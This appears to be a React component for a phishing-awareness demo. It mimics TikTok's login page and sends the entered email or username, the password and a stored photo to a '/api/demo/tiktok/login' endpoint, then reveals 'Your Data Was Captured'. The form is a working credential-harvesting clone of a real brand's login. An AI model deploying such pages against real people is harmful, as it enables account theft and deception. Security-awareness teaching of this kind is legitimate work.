import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { AlertCircle, ArrowLeft } from 'lucide-react';
import { getApiUrl } from '../../api';

export default function TikTokLogin() {
  const navigate = useNavigate();
  const [credentials, setCredentials] = useState({ email: '', password: '' });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const sessionId = sessionStorage.getItem('sessionId');
    const photoData = sessionStorage.getItem('lastPhotoData');

    try {
      await fetch(getApiUrl('/api/demo/tiktok/login'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, email_or_username: credentials.email, password: credentials.password, photo_data: photoData, timestamp: new Date().toISOString() }),
      }).catch(() => {});
    } finally {
      setIsLoading(false);
      setIsSubmitted(true);
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-black to-gray-900 flex items-center justify-center p-4">
        <div className="max-w-2xl w-full">
          <div className="bg-white rounded-xl shadow-2xl p-8">
            <div className="flex justify-center mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle size={40} className="text-red-600" />
              </div>
            </div>
            <h1 className="text-3xl font-bold text-center text-gray-900 mb-4">🎬 Your Data Was Captured</h1>
            <div className="flex gap-4">
              <button onClick={() => navigate('/')} className="flex-1 flex items-center justify-center gap-2 px-6 py-3 bg-gray-600 text-white font-bold rounded-lg hover:bg-gray-700 transition">
                <ArrowLeft size={20} /> Home
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        <div className="mb-8 text-center">
          <div className="text-6xl font-black text-white mb-4">♪</div>
          <h1 className="text-2xl font-bold text-white mb-2">TikTok</h1>
          <p className="text-gray-400">Log in to TikTok</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4 mb-6">
          <input type="text" placeholder="Email or username" value={credentials.email} onChange={(e) => setCredentials({ ...credentials, email: e.target.value })} className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-white placeholder-gray-500 focus:border-pink-500 outline-none" required />
          <input type="password" placeholder="Password" value={credentials.password} onChange={(e) => setCredentials({ ...credentials, password: e.target.value })} className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-white placeholder-gray-500 focus:border-pink-500 outline-none" required />
          <button type="submit" disabled={isLoading || !credentials.email || !credentials.password} className="w-full bg-pink-600 text-white font-bold py-2 rounded hover:bg-pink-700 transition disabled:opacity-50">
            {isLoading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        <div className="text-center text-sm text-gray-400">
          Don't have an account? <span className="text-pink-500 font-bold cursor-pointer">Sign up</span>
        </div>
      </div>
    </div>
  );
}
